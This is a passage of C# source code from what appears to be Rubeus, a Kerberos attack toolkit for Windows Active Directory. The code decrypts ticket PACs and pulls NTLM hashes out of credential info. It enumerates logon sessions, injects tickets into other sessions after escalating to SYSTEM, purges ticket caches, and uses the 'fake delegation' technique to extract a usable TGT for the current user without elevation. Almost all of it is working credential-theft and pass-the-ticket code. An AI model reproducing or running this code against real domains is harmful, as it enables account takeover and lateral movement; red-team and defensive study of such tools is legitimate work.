((long)li.KerbValidationInfo.PasswordCanChange.HighDateTime << 32)).ToLocalTime());\n                            }\n                            catch\n                            {\n                                Console.WriteLine("{0}    PasswordCanChange    : {1}", indent, li.KerbValidationInfo.PasswordCanChange);\n                            }\n                            try\n                            {\n                                Console.WriteLine("{0}    PasswordMustChange   : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordMustChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordMustChange.HighDateTime << 32)).ToLocalTime());\n                            }\n                            catch\n                            {\n                                Console.WriteLine("{0}    PasswordMustChange   : {1}", indent, li.KerbValidationInfo.PasswordMustChange);\n                            }\n                            Console.WriteLine("{0}    EffectiveName        : {1}", indent, li.KerbValidationInfo.EffectiveName);\n                            Console.WriteLine("{0}    FullName             : {1}", indent, li.KerbValidationInfo.FullName);\n                            Console.WriteLine("{0}    LogonScript          : {1}", indent, li.KerbValidationInfo.LogonScript);\n                            Console.WriteLine("{0}    ProfilePath          : {1}", indent, li.KerbValidationInfo.ProfilePath);\n                            Console.WriteLine("{0}    HomeDirectory        : {1}", indent, li.KerbValidationInfo.HomeDirectory);\n                            Console.WriteLine("{0}    HomeDirectoryDrive   : {1}", indent, li.KerbValidationInfo.HomeDirectoryDrive);\n                            Console.WriteLine("{0}    LogonCount           : {1}", indent, li.KerbValidationInfo.LogonCount);\n                            Console.WriteLine("{0}    BadPasswordCount     : {1}", indent, li.KerbValidationInfo.BadPasswordCount);\n                            Console.WriteLine("{0}    UserId               : {1}", indent, li.KerbValidationInfo.UserId);\n                            Console.WriteLine("{0}    PrimaryGroupId       : {1}", indent, li.KerbValidationInfo.PrimaryGroupId);\n                            Console.WriteLine("{0}    GroupCount           : {1}", indent, li.KerbValidationInfo.GroupCount);\n                            if (li.KerbValidationInfo.GroupCount > 0)\n                            {\n                                Console.WriteLine("{0}    Groups               : {1}", indent, li.KerbValidationInfo.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));\n                            }\n                            Console.WriteLine("{0}    UserFlags            : ({1}) {2}", indent, li.KerbValidationInfo.UserFlags, (Interop.PacUserFlags)li.KerbValidationInfo.UserFlags);\n                            Console.WriteLine("{0}    UserSessionKey       : {1}", indent, Helpers.ByteArrayToString((byte[])(Array)li.KerbValidationInfo.UserSessionKey.data[0].data));\n                            Console.WriteLine("{0}    LogonServer          : {1}", indent, li.KerbValidationInfo.LogonServer);\n                            Console.WriteLine("{0}    LogonDomainName      : {1}", indent, li.KerbValidationInfo.LogonDomainName);\n                            Console.WriteLine("{0}    LogonDomainId        : {1}", indent, li.KerbValidationInfo.LogonDomainId?.GetValue());\n                            Console.WriteLine("{0}    UserAccountControl   : ({1}) {2}", indent, li.KerbValidationInfo.UserAccountControl, (Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl);\n                            Console.WriteLine("{0}    ExtraSIDCount        : {1}", indent, li.KerbValidationInfo.SidCount);\n                            if (li.KerbValidationInfo.SidCount > 0)\n                            {\n                                Console.WriteLine("{0}    ExtraSIDs            : {1}", indent, li.KerbValidationInfo.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));\n                            }\n                            Console.WriteLine("{0}    ResourceGroupCount   : {1}", indent, li.KerbValidationInfo.ResourceGroupCount);\n                            if (li.KerbValidationInfo.ResourceGroupCount > 0)\n                            {\n                                Console.WriteLine("{0}    ResourceGroupSid     : {1}", indent, li.KerbValidationInfo.ResourceGroupDomainSid?.GetValue());\n                                Console.WriteLine("{0}    ResourceGroups       : {1}", indent, li.KerbValidationInfo.ResourceGroupIds?.GetValue().Select(s => s.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));\n                            }\n                        }\n                        else if (pacInfoBuffer is PacCredentialInfo ci)\n                        {\n\n                            Console.WriteLine("{0}  CredentialInfo         :", indent);\n                            Console.WriteLine("{0}    Version              : {1}", indent, ci.Version);\n                            Console.WriteLine("{0}    EncryptionType       : {1}", indent, ci.EncryptionType);\n\n                            if (ci.CredentialInfo.HasValue)\n                            {\n\n                                Console.WriteLine("{0}    CredentialData       :", indent);\n                                Console.WriteLine("{0}      CredentialCount    : {1}", indent, ci.CredentialInfo.Value.CredentialCount);\n\n                                foreach (var credData in ci.CredentialInfo.Value.Credentials)\n                                {\n                                    string hash = "";\n                                    if ("NTLM".Equals(credData.PackageName.ToString()))\n                                    {\n                                        int version = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 0);\n                                        int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);\n                                        if (flags == 3)\n                                        {\n                                            hash = String.Format("{0}:{1}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray()), Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));\n                                        }\n                                        else\n                                        {\n                                            hash = String.Format("{0}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));\n                                        }\n                                    }\n                                    else\n                                    {\n                                        hash = Helpers.ByteArrayToString((byte[])(Array)credData.Credentials);\n                                    }\n\n                                    Console.WriteLine("          {0}             : {1}", credData.PackageName, hash);\n                                }\n\n                            }\n                            else\n                            {\n                                Console.WriteLine("{0}    CredentialData    :   *** NO KEY ***", indent);\n                            }\n                        }\n                        else if (pacInfoBuffer is S4UDelegationInfo s4u)\n                        {\n                            Console.WriteLine("{0}  S4UDelegationInfo      :", indent);\n                            Console.WriteLine("{0}    S4U2ProxyTarget      : {1}", indent, s4u.s4u.S4U2proxyTarget.ToString());\n                            Console.WriteLine("{0}    TransitedListSize    : {1}", indent, s4u.s4u.TransitedListSize);\n                            Console.WriteLine("{0}    S4UTransitedServices : {1}", indent, s4u.s4u.S4UTransitedServices.GetValue().Select(s => s.ToString()).Aggregate((cur, next) => cur + " <= " + next));\n                        }\n                        else if (pacInfoBuffer is Requestor requestor)\n                        {\n                            Console.WriteLine("{0}  Requestor              :", indent);\n                            Console.WriteLine("{0}    RequestorSID         : {1}", indent, requestor.RequestorSID.ToString());\n                        }\n                        else if (pacInfoBuffer is Attributes att)\n                        {\n                            Console.WriteLine("{0}  Attributes             :", indent);\n                            Console.WriteLine("{0}    AttributeLength      : {1}", indent, att.Length);\n                            Console.WriteLine("{0}    AttributeFlags       : ({1}) {2}", indent, (int)att.Flags, att.Flags);\n                        }\n                    }\n                }\n                catch\n                {\n                    Console.WriteLine("[!] Unable to decrypt the EncTicketPart using key: {0}", Helpers.ByteArrayToString(serviceKey));\n                    Console.WriteLine("[!] Check the right key was passed for the encryption type: {0}", (Interop.KERB_ETYPE)cred.tickets[0].enc_part.etype);\n                }\n            }\n\n            Console.WriteLine();\n        }\n\n        public static void SaveTicketsToRegistry(List<KRB_CRED> creds, string baseRegistryKey)\n        {\n            // saves an array of .kirbis to the registry\n\n            string user = null;\n            RegistryKey basePath = null;\n            if (Helpers.IsSystem())\n            {\n                user = "NT AUTHORITY\\\\SYSTEM";\n            }\n            else\n            {\n                user = Environment.UserDomainName + "\\\\" + Environment.UserName;\n            };\n\n            try\n            {\n                // first,make sure the appropriate ACLs are set\n                Registry.LocalMachine.CreateSubKey(baseRegistryKey);\n                basePath = Registry.LocalMachine.OpenSubKey(baseRegistryKey, RegistryKeyPermissionCheck.ReadWriteSubTree);\n                var rs = basePath.GetAccessControl();\n                var rar = new RegistryAccessRule(\n                    user,\n                    RegistryRights.FullControl,\n                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,\n                    PropagationFlags.None,\n                    AccessControlType.Allow);\n                rs.AddAccessRule(rar);\n                basePath.SetAccessControl(rs);\n            }\n            catch\n            {\n                Console.WriteLine("[-] Error setting correct ACLs for HKLM:\\\\{0}", baseRegistryKey);\n                basePath = null;\n            }\n            if (basePath != null)\n            {\n                foreach (var cred in creds)\n                {\n                    var userName = cred.enc_part.ticket_info[0].pname.name_string[0];\n                    var domainName = cred.enc_part.ticket_info[0].prealm;\n                    var startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);\n                    var endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);\n                    var renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);\n                    var flags = cred.enc_part.ticket_info[0].flags;\n                    var base64TGT = Convert.ToBase64String(cred.Encode().Encode());\n\n                    var userData = basePath.CreateSubKey(userName + "@" + domainName);\n\n                    // Create the keys underneath this\n                    userData.SetValue("Username", domainName + "\\\\" + userName);\n                    userData.SetValue("StartTime", startTime);\n                    userData.SetValue("EndTime", endTime);\n                    userData.SetValue("RenewTill", renewTill);\n                    userData.SetValue("Flags", flags);\n                    userData.SetValue("Base64EncodedTicket", base64TGT);\n                }\n                Console.WriteLine("\\r\\n[*] Wrote {0} tickets to HKLM:\\\\{1}.", creds.Count, baseRegistryKey);\n            }\n        }\n\n        #endregion\n\n\n        #region LogonSessions\n\n        public static List<LUID> EnumerateLogonSessions()\n        {\n            // returns a List of LUIDs representing current logon sessions\n            var luids = new List<LUID>();\n\n            if (!Helpers.IsHighIntegrity())\n            {\n                luids.Add(Helpers.GetCurrentLUID());\n            }\n\n            else\n            {\n                var ret = Interop.LsaEnumerateLogonSessions(out var count, out var luidPtr);\n\n                if (ret != 0)\n                {\n                    throw new Win32Exception(ret);\n                }\n\n                for (ulong i = 0; i < count; i++)\n                {\n                    var luid = (LUID)Marshal.PtrToStructure(luidPtr, typeof(LUID));\n                    luids.Add(luid);\n                    luidPtr = (IntPtr)(luidPtr.ToInt64() + Marshal.SizeOf(typeof(LUID)));\n                }\n                Interop.LsaFreeReturnBuffer(luidPtr);\n            }\n\n            return luids;\n        }\n\n        public class LogonSessionData\n        {\n            public LUID LogonID;\n            public string Username;\n            public string LogonDomain;\n            public string AuthenticationPackage;\n            public Interop.LogonType LogonType;\n            public int Session;\n            public SecurityIdentifier Sid;\n            public DateTime LogonTime;\n            public string LogonServer;\n            public string DnsDomainName;\n            public string Upn;\n        }\n\n        public static LogonSessionData GetLogonSessionData(LUID luid)\n        {\n            // gets additional logon session information for a given LUID\n\n            var luidPtr = IntPtr.Zero;\n            var sessionDataPtr = IntPtr.Zero;\n\n            try\n            {\n                luidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(luid));\n                Marshal.StructureToPtr(luid, luidPtr, false);\n\n                var ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionDataPtr);\n                if (ret != 0)\n                {\n                    throw new Win32Exception((int)ret);\n                }\n\n                var unsafeData =\n                    (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionDataPtr,\n                        typeof(Interop.SECURITY_LOGON_SESSION_DATA));\n\n                return new LogonSessionData()\n                {\n                    AuthenticationPackage = Marshal.PtrToStringUni(unsafeData.AuthenticationPackage.Buffer, unsafeData.AuthenticationPackage.Length / 2),\n                    DnsDomainName = Marshal.PtrToStringUni(unsafeData.DnsDomainName.Buffer, unsafeData.DnsDomainName.Length / 2),\n                    LogonDomain = Marshal.PtrToStringUni(unsafeData.LoginDomain.Buffer, unsafeData.LoginDomain.Length / 2),\n                    LogonID = unsafeData.LoginID,\n                    LogonTime = DateTime.FromFileTime((long)unsafeData.LoginTime),\n                    //LogonTime = systime.AddTicks((long)unsafeData.LoginTime),\n                    LogonServer = Marshal.PtrToStringUni(unsafeData.LogonServer.Buffer, unsafeData.LogonServer.Length / 2),\n                    LogonType = (Interop.LogonType)unsafeData.LogonType,\n                    Sid = (unsafeData.PSiD == IntPtr.Zero ? null : new SecurityIdentifier(unsafeData.PSiD)),\n                    Upn = Marshal.PtrToStringUni(unsafeData.Upn.Buffer, unsafeData.Upn.Length / 2),\n                    Session = (int)unsafeData.Session,\n                    Username = Marshal.PtrToStringUni(unsafeData.Username.Buffer, unsafeData.Username.Length / 2),\n                };\n            }\n            finally\n            {\n                if (sessionDataPtr != IntPtr.Zero)\n                    Interop.LsaFreeReturnBuffer(sessionDataPtr);\n\n                if (luidPtr != IntPtr.Zero)\n                    Marshal.FreeHGlobal(luidPtr);\n            }\n        }\n\n        #endregion\n\n\n        #region Import and Export\n\n        public static void ImportTicket(byte[] ticket, LUID targetLuid)\n        {\n            // uses LsaCallAuthenticationPackage() with a message type of KERB_SUBMIT_TKT_REQUEST to submit a ticket\n            //  for the current (or specified) logon session\n\n            // straight from Vincent LE TOUX\' work\n            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971\n\n            var LsaHandle = IntPtr.Zero;\n            int AuthenticationPackage;\n            int ntstatus, ProtocalStatus;\n\n            if ((ulong)targetLuid != 0)\n            {\n                if (!Helpers.IsHighIntegrity())\n                {\n                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");\n                    return;\n                }\n                else\n                {\n                    if (Helpers.IsSystem())\n                    {\n                        // if we\'re already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper\n                        LsaHandle = LsaRegisterLogonProcessHelper();\n                    }\n                    else\n                    {\n                        // elevated but not system, so gotta GetSystem() first\n                        Helpers.GetSystem();\n                        // should now have the proper privileges to get a Handle to LSA\n                        LsaHandle = LsaRegisterLogonProcessHelper();\n                        // we don\'t need our NT AUTHORITY\\SYSTEM Token anymore so we can revert to our original token\n                        Interop.RevertToSelf();\n                    }\n                }\n            }\n            else\n            {\n                // otherwise use the unprivileged connection with LsaConnectUntrusted\n                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);\n            }\n\n            var inputBuffer = IntPtr.Zero;\n            IntPtr ProtocolReturnBuffer;\n            int ReturnBufferLength;\n            try\n            {\n                Interop.LSA_STRING_IN LSAString;\n                var Name = "kerberos";\n                LSAString.Length = (ushort)Name.Length;\n                LSAString.MaximumLength = (ushort)(Name.Length + 1);\n                LSAString.Buffer = Name;\n                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);\n                if (ntstatus != 0)\n                {\n                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);\n                    var errorMessage = new Win32Exception((int)winError).Message;\n                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);\n                    return;\n                }\n                var request = new Interop.KERB_SUBMIT_TKT_REQUEST();\n                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;\n                request.KerbCredSize = ticket.Length;\n                request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));\n\n                if ((ulong)targetLuid != 0)\n                {\n                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);\n                    request.LogonId = targetLuid;\n                }\n\n                var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;\n                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);\n                Marshal.StructureToPtr(request, inputBuffer, false);\n                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);\n                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);\n                if (ntstatus != 0)\n                {\n                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);\n                    var errorMessage = new Win32Exception((int)winError).Message;\n                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);\n                    return;\n                }\n                if (ProtocalStatus != 0)\n                {\n                    var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);\n                    var errorMessage = new Win32Exception((int)winError).Message;\n                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);\n                    return;\n                }\n                Console.WriteLine("[+] Ticket successfully imported!");\n            }\n            finally\n            {\n                if (inputBuffer != IntPtr.Zero)\n                    Marshal.FreeHGlobal(inputBuffer);\n                Interop.LsaDeregisterLogonProcess(LsaHandle);\n            }\n        }\n\n        public static void Purge(LUID targetLuid)\n        {\n            // uses LsaCallAuthenticationPackage() with a message type of KERB_PURGE_TKT_CACHE_REQUEST to purge tickets\n            //  for the current (or specified) logon session\n\n            // straight from Vincent LE TOUX\' work\n            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971\n\n            var lsaHandle = GetLsaHandle();\n            int AuthenticationPackage;\n            int ntstatus, ProtocalStatus;\n\n            if ((ulong)targetLuid != 0)\n            {\n                if (!Helpers.IsHighIntegrity())\n                {\n                    Console.WriteLine("[X] You need to be in high integrity to purge tickets from a different logon session");\n                    return;\n                }\n\n            }\n\n            var inputBuffer = IntPtr.Zero;\n            IntPtr ProtocolReturnBuffer;\n            int ReturnBufferLength;\n            try\n            {\n                Interop.LSA_STRING_IN LSAString;\n                var Name = "kerberos";\n                LSAString.Length = (ushort)Name.Length;\n                LSAString.MaximumLength = (ushort)(Name.Length + 1);\n                LSAString.Buffer = Name;\n                ntstatus = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out AuthenticationPackage);\n                if (ntstatus != 0)\n                {\n                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);\n                    var errorMessage = new Win32Exception((int)winError).Message;\n                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);\n                    return;\n                }\n\n                var request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();\n                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;\n\n                if ((ulong)targetLuid != 0)\n                {\n                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);\n                    request.LogonId = targetLuid;\n                }\n\n                var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST));\n                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);\n                Marshal.StructureToPtr(request, inputBuffer, false);\n                ntstatus = Interop.LsaCallAuthenticationPackage(lsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);\n                if (ntstatus != 0)\n                {\n                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);\n                    var errorMessage = new Win32Exception((int)winError).Message;\n                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);\n                    return;\n                }\n                if (ProtocalStatus != 0)\n                {\n                    var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);\n                    var errorMessage = new Win32Exception((int)winError).Message;\n                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);\n                    return;\n                }\n                Console.WriteLine("[+] Tickets successfully purged!");\n            }\n            finally\n            {\n                if (inputBuffer != IntPtr.Zero)\n                    Marshal.FreeHGlobal(inputBuffer);\n                Interop.LsaDeregisterLogonProcess(lsaHandle);\n            }\n        }\n\n        #endregion\n\n\n        #region Misc Helpers\n\n        public static byte[] GetEncryptionKeyFromCache(string target, Interop.KERB_ETYPE etype)\n        {\n            // gets the cached session key for a given service ticket\n            //  used by RequestFakeDelegTicket()\n\n            int authPack;\n            IntPtr lsaHandle;\n            int retCode;\n            var name = "kerberos";\n            byte[] returnedSessionKey;\n            Interop.LSA_STRING_IN LSAString;\n            LSAString.Length = (ushort)name.Length;\n            LSAString.MaximumLength = (ushort)(name.Length + 1);\n            LSAString.Buffer = name;\n\n            retCode = Interop.LsaConnectUntrusted(out lsaHandle);\n            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);\n\n            var returnBufferLength = 0;\n            var protocalStatus = 0;\n            var responsePointer = IntPtr.Zero;\n            var request = new Interop.KERB_RETRIEVE_TKT_REQUEST();\n            var response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();\n\n            // signal that we want encoded .kirbi\'s returned\n            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;\n            request.CacheOptions = (uint)Interop.KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;\n            request.EncryptionType = (int)etype;\n\n            // target SPN to fake delegation for\n            var tName = new Interop.UNICODE_STRING(target);\n            request.TargetName = tName;\n\n            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST\n            //      for KerbRetrieveEncodedTicketMessages\n\n            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len\n            var structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));\n            var newStructSize = structSize + tName.MaximumLength;\n            var unmanagedAddr = Marshal.AllocHGlobal(newStructSize);\n\n            // marshal the struct from a managed object to an unmanaged block of memory.\n            Marshal.StructureToPtr(request, unmanagedAddr, false);\n\n            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST\n            var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));\n\n            // copy unicode chars to the new location\n            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);\n\n            // update the target name buffer ptr            \n            Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);\n\n            // actually get the data\n            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);\n\n            // translate the LSA error (if any) to a Windows error\n            var winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);\n\n            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))\n            {\n                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure\n                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));\n\n                // extract the session key\n                var sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;\n                var sessionKeyLength = response.Ticket.SessionKey.Length;\n                var sessionKey = new byte[sessionKeyLength];\n                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);\n\n                returnedSessionKey = sessionKey;\n            }\n            else\n            {\n                var errorMessage = new Win32Exception((int)winError).Message;\n                Console.WriteLine("\\r\\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \\"{1}\\" : {2}", winError, target, errorMessage);\n                returnedSessionKey = null;\n            }\n\n            // clean up\n            Interop.LsaFreeReturnBuffer(responsePointer);\n            Marshal.FreeHGlobal(unmanagedAddr);\n\n            // disconnect from LSA\n            Interop.LsaDeregisterLogonProcess(lsaHandle);\n\n            return returnedSessionKey;\n        }\n\n        public static byte[] RequestFakeDelegTicket(string targetSPN = "", bool display = true)\n        {\n            // requests a ticket to \'cifs/dc.domain.com\', which *should* be configured for unconstrained delegation\n            //  the AP-REQ and associated forwarded TGT for the current user is carved out of GSS-API, so we get\n            //  a usable TGT for the current user, without elevation\n\n            byte[] finalTGTBytes = null;\n\n            if (String.IsNullOrEmpty(targetSPN))\n            {\n                if (display)\n                {\n                    Console.WriteLine("[*] No target SPN specified, attempting to build \'cifs/dc.domain.com\'");\n                }\n                // try to get the current domain and domain controller\n                var domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;\n                var domainController = Networking.GetDCName(domain);\n                if (String.IsNullOrEmpty(domainController))\n                {\n                    Console.WriteLine("[X] Error retrieving current domain controller");\n                    return null;\n                }\n                targetSPN = String.Format("cifs/{0}", domainController);\n            }\n\n            var phCredential = new Interop.SECURITY_HANDLE();\n            var ptsExpiry = new Interop.SECURITY_INTEGER();\n            var SECPKG_CRED_OUTBOUND = 2;\n\n            // first get a handle to the Kerberos package\n            var status = Interop.AcquireCredentialsHandle(null, "Kerberos", SECPKG_CRED_OUTBOUND, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref phCredential, ref ptsExpiry);\n\n            if (status == 0)\n            {\n                var ClientToken = new Interop.SecBufferDesc(12288);\n                var ClientContext = new Interop.SECURITY_HANDLE(0);\n                uint ClientContextAttributes = 0;\n                var ClientLifeTime = new Interop.SECURITY_INTEGER(0);\n                var SECURITY_NATIVE_DREP = 0x00000010;\n                var SEC_E_OK = 0x00000000;\n                var SEC_I_CONTINUE_NEEDED = 0x00090312;\n\n                if (display)\n                {\n                    Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target \'{0}\'", targetSPN);\n                }\n\n                // now initialize the fake delegate ticket for the specified targetname (default cifs/DC.domain.com)\n                var status2 = Interop.InitializeSecurityContext(ref phCredential,\n                            IntPtr.Zero,\n                            targetSPN, // null string pszTargetName,\n                            (int)(Interop.ISC_REQ.ALLOCATE_MEMORY | Interop.ISC_REQ.DELEGATE | Interop.ISC_REQ.MUTUAL_AUTH),\n                            0, //int Reserved1,\n                            SECURITY_NATIVE_DREP, //int TargetDataRep\n                            IntPtr.Zero,    //Always zero first time around...\n                            0, //int Reserved2,\n                            out ClientContext, //pHandle CtxtHandle = SecHandle\n                            out ClientToken, //ref SecBufferDesc pOutput, //PSecBufferDesc\n                            out ClientContextAttributes, //ref int pfContextAttr,\n                            out ClientLifeTime); //ref IntPtr ptsExpiry ); //PTimeStamp\n\n                if ((status2 == SEC_E_OK) || (status2 == SEC_I_CONTINUE_NEEDED))\n                {\n                    if (display)\n                    {\n                        Console.WriteLine("[+] Kerberos GSS-API initialization success!");\n                    }\n\n                    if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) == 1)\n                    {\n                        if (display)\n                        {\n                            Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");\n                        }\n\n                        // the fake delegate AP-REQ ticket is now in the cache!\n\n                        // the Kerberos OID to search for in the output stream\n                        //  from Kekeo -> https://github.com/gentilkiwi/kekeo/blob/master/kekeo/modules/kuhl_m_tgt.c#L329-L345\n                        byte[] KeberosV5 = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 }; // 1.2.840.113554.1.2.2\n                        var ClientTokenArray = ClientToken.GetSecBufferByteArray();\n                        var index = Helpers.SearchBytePattern(KeberosV5, ClientTokenArray);\n                        if (index > 0)\n                        {\n                            var startIndex = index += KeberosV5.Length;\n\n                            // check if the first two bytes == TOK_ID_KRB_AP_REQ\n                            if ((ClientTokenArray[startIndex] == 1) && (ClientTokenArray[startIndex + 1] == 0))\n                            {\n                                if (display)\n                                {\n                                    Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");\n                                }\n\n                                startIndex += 2;\n                                var apReqArray = new byte[ClientTokenArray.Length - startIndex];\n                                Buffer.BlockCopy(ClientTokenArray, startIndex, apReqArray, 0, apReqArray.Length);\n\n                                // decode the supplied bytes to an AsnElt object\n                                //  false == ignore trailing garbage\n                                var asn_AP_REQ = AsnElt.Decode(apReqArray, false);\n\n                                foreach (var elt in asn_AP_REQ.Sub[0].Sub)\n                                {\n                                    if (elt.TagValue == 4)\n                                    {\n                                        // build the encrypted authenticator\n                                        var encAuthenticator = new EncryptedData(elt.Sub[0]);\n                                        var authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;\n                                        if (display)\n                                        {\n                                            Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);\n                                        }\n\n                                        // grab the service ticket session key from the local cache\n                                        var key = GetEncryptionKeyFromCache(targetSPN, authenticatorEtype);\n\n                                        if (key != null)\n                                        {\n                                            var base64SessionKey = Convert.ToBase64String(key);\n                                            if (display)\n                                            {\n                                                Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);\n                                            }\n\n                                            // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11\n                                            var rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);\n\n                                            var asnAuthenticator = AsnElt.Decode(rawBytes, false);\n\n                                            foreach (var elt2 in asnAuthenticator.Sub[0].Sub)\n                                            {\n                                                if (elt2.TagValue == 3)\n                                                {\n                                                    if (display)\n                                                    {\n                                                        Console.WriteLine("[+] Successfully decrypted the authenticator");\n                                                    }\n\n                                                    var cksumtype = Convert.ToInt32(elt2.Sub[0].Sub[0].Sub[0].GetInteger());\n\n                                                    // check if cksumtype == GSS_CHECKSUM_TYPE\n                                                    if (cksumtype == 0x8003)\n                                                    {\n                                                        var checksumBytes = elt2.Sub[0].Sub[1].Sub[0].GetOctetString();\n\n                                                        // check if the flags include GSS_C_DELEG_FLAG\n                                                        if ((checksumBytes[20] & 1) == 1)\n                                                        {\n                                                            var dLen = BitConverter.ToUInt16(checksumBytes, 26);\n                                                            var krbCredBytes = new byte[dLen];\n                                                            // copy out the krbCredBytes from the checksum structure\n                                                            Buffer.BlockCopy(checksumBytes, 28, krbCredBytes, 0, dLen);\n\n                                                            var asn_KRB_CRED = AsnElt.Decode(krbCredBytes, false);\n                                                            Ticket ticket = null;\n                                                            var cred = new KRB_CRED();\n\n                                                            foreach (var elt3 in asn_KRB_CRED.Sub[0].Sub)\n                                                            {\n                                                                if (elt3.TagValue == 2)\n                                                                {\n                                                                    // extract the TGT and add it to the KRB-CRED\n                                                                    ticket = new Ticket(elt3.Sub[0].Sub[0].Sub[0]);\n                                                                    